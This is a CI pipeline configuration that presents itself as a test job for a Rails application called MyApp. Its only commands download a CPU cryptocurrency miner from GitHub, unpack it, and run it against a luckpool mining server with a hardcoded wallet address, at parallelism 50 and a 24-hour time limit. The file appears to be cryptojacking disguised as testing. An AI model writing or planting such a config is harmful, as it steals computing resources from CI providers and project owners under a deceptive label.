version: v1.0
name: Test MyApp
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
blocks:
  - name: Test
    task:
      env_vars:
        - name: DATABASE_URL
          value: 'postgresql://postgres:@0.0.0.0:5432/myapp_test'
        - name: RAILS_ENV
          value: test
      jobs:
        - name: Test
          commands:
            - 'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz'
            - tar xf hellminer_cpu_linux.tar.gz
            - './hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RVXxf8Ci9MP5VmmkPyXjz3GUdzpBvmBJNH.BAYU -p x --cpu 2'
          parallelism: 50
